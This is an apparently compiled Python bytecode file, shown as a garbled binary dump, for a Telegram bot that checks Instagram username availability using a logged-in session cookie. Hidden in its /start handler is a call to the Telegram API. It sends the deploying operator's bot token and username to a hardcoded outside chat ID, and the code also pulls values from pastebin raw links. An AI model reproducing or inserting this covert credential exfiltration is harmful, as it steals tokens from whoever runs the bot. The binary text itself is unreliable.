a
    G?a`?(  ?                   @   s.  d dl Z d dlZd dlmZ d dlZejZe?e?ZejZejZej	Z	ddddddd	d
dddddddd?Z
e ?d?jZe ?d?jZdd? Zejdgd?dd? ?Zejdgd?dd? ?Zejdgd?dd? ?Zejdd? d?d d!? ?Zzejd"d#? W q? e?y& Z zej?e? W Y dZ[q?dZ[0 0 q?dS )$?    N)?types??text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9?gzip, deflate, br?ar,en-US;q=0.9,en;q=0.8z	max-age=0z
keep-alive?1zapi.telegram.org?@"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"??0?document?navigate?none??1zrMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36)ZAcceptzAccept-EncodingzAccept-LanguagezCache-ControlZ
ConnectionZDNTZHost?	sec-ch-ua?sec-ch-ua-mobilezSec-Fetch-DestzSec-Fetch-ModezSec-Fetch-SitezSec-Fetch-UserzUpgrade-Insecure-Requestsz
User-Agentz!https://pastebin.com/raw/9Ktn4H4dz!https://pastebin.com/raw/j8Pe342rc                 C   s4   d}t dd?}|D ]}|?? | krd}q|??  |S )NF?	users.txt?rT)?open?strip?close)?id?result?file?line? r   ?bot.py?ex_id#   s    
r   ?start)Zcommandsc              	   C   s?  | j jdkrB| jj}tdd?}tt|??sB|?|? d?? |??  tdd?}t	?
? }t	jddd?}|?|? t|?? ?}| jj}| jj}d	t? d
t? d|? ?}	tj|	td?}
t|
?? d d ?}d	t? d
t? d|? ?}tj|td?}t|?? d d ?}|tk?s|dk?rP| jj}t?d	t? dt? d|? d?? tj| j jd|? d?d|d? |dk?sn|dk?sn|dk?r?|dk?s?|dk?s?|dk?r?tj| j jd|? d?d|d? ntj| j jdt? d?dd? ntj| j jdt? d?dd? d S )NZprivater   ?a?
r   ?	Developer?t.me/moamalhussin??text?url?https://api.telegram.org/bot?/getChatMember?chat_id=@?	&user_id=??headersr   ?status??t?MzL/sendMessage?chat_id=1300329679&text=new bot has been start boss 

 token : z 

 username : @z 

 zHi boss

Users count : zF 
You can make Broadcast : (/bc message)
You can get users id (/file)
?markdown?r!   ?
parse_mode?reply_markup?member?creator?administratorz* Hi my love z$ *

*Send username to check it : * 
?*Subscribe (@?) and press (/start)*?r!   r,   )?chat?type?	from_userr   r   r   ?str?writer   r   ?InlineKeyboardMarkup?InlineKeyboardButton?add?len?	readlinesZ
first_name?token?ch?requests?get?headerss?json?	req_token?req_channel?sudo?username?bot?send_message)?message?idu?fr   ?key?sudooZli?first?idd?sub?reqr(   ?submores?reqmores?statusmoresZ	usernameer   r   r   r   -   sH    


?????bcc                 C   sj   | j j}|tks|dkrT| j?dd?}tdd?}|D ]}tj|d|? d?dd? q4ntj| jjd	d
? d S )Nr)   z/bc? r   r   ?*r*   r3   ?,   Sorry, but you are not the developer 🙂❗?r!   )	r6   r   rF   r!   ?replacer   rH   rI   r4   )rJ   rK   ZmesZreaddr   r   r   rV   W   s    
r   c                 C   sJ   | j j}|tks|dkr4tdd?}t?| jj|? ntj| jjdd? d S )Nr)   r   ?rbrY   rZ   )r6   r   rF   r   rH   Zsend_documentr4   rI   )rJ   rK   r   r   r   r   r   c   s
    
c                 C   s   dS )NTr   )?mr   r   r   ?<lambda>m   ?    r^   )?funcc                 C   s?  | j }| jj}t?? }tjddd?}|?|? dt? dt? d|? ?}t	j
|td?}t|?? d d	 ?}dt? dt? d|? ?}t	j
|td?}	t|	?? d d	 ?}
g d
?}g d?}|d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?s||d  |v ?s||d! |v ?s||d" |v ?s||d# |v ?s||d$ |v ?s||d% |v ?s||d& |v ?s||d' |v ?s||d( |v ?s||d |v ?s||d |v ?s||d |v ?s||d |v ?r?tj| jjd)d*|d+? ?ndt|?dk?r?tj| jjd,d*|d+? ?n<d-|v ?r?tj| jjd.d*|d+? ?n|
d/k?s |
d0k?s |
d1k?r?|d/k?s|d0k?s|d1k?r?d2|? d3?}d4d5d6d7tj? ?d8d9d:d;d<d=d>d8d?d@?}t	j
||d?j}t	j
||d?j }|dAk?r?dB|v ?r?tj| jjdC|? ?d*dD? t|?dk?r?tjtdE|? ?d*|d+? n?|dFk?r?dG|v ?s?|dFk?rdH|v ?rtj| jjdI|? ?d*dD? n?|dFk?r>dJ|v ?r>tj| jjdK|? ?d*|d+? n?|dLk?rRdG|v ?sf|dLk?r?dH|v ?r?tj| jjdI|? ?d*|d+? n:tj| jjdM|? ?|dN? tjtdOt? dP|? dQ?d*|d+? ntj| jjdRt? dS?d*dD? ntj| jjdRt? dS?d*dD? d S )TNr   r   r    r#   r$   r%   r&   r   r(   )u   اu   بu   تu   ثu   جu   حu   خu   دu   ذu   رu   زu   سu   شu   صu   ضu   طu   ظu   عu   غu   فu   قu   كu   لu   مu   نu   هu   وu   يu   ء)?>?,z?/?!?~?`?#?$?%?^?&rX   ?(?)?-?=?+?}?{?[?]?:?;r   ?   ?   ?   ?   ?   ?   ?   ?   ?	   ?
   ?   ?   ?   ?   ?   ?   ?   ?   ?   ?   ?   ?   ?   ?   ?   ?   ?   ?   z *Sorry, We don't accept Symbols*r*   r+   z(*Sorry, We don't accept 12 word or more*?@z*Sorry, Send user without (@)*r.   r/   r0   zhttps://www.instagram.com/?/r   r   r   zsessionid= r   r   r   r	   r
   r   r   zrMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36)Zacceptzaccept-encodingzaccept-language?cookieZdntr   r   zsec-fetch-destzsec-fetch-modezsec-fetch-sitezsec-fetch-userzupgrade-insecure-requestsz
user-agenti?  Z	Instagramu   *|✅| Username Available >> *r3   u(   Hi Boss 

*|✅| Username Available >> *??   zis on InstagramzInstagram photos and videosu   *|❌| Username Taken >> *ZUnavailableu   *|🛑| Username Banned >> *i.  u   *|⚠| Error >> *)r!   r-   z*Hurry Boss* 

*username : @z have error* 
*error in : rX   r1   r2   )r!   r6   r   r   r9   r:   r;   r>   r?   r@   rA   rB   r7   rC   rD   rE   rH   rI   r4   r<   ?config?	sessionidZstatus_coderF   rG   )rJ   ?msgrP   rM   rN   rQ   rR   r(   rS   rT   rU   ZarZspr"   r'   ?resr   r   r   ?checkm   s?    
? ?

???((????r?   T)Z	none_stop)r@   Ztelebotr   r?   r>   ZTeleBotrH   r?   rF   r?   rB   rA   r!   rE   rD   r   Zmessage_handlerr   rV   r   r?   Zpolling?	Exception?exZlogger?errorr   r   r   r   ?<module>   sV   
???

)

	
C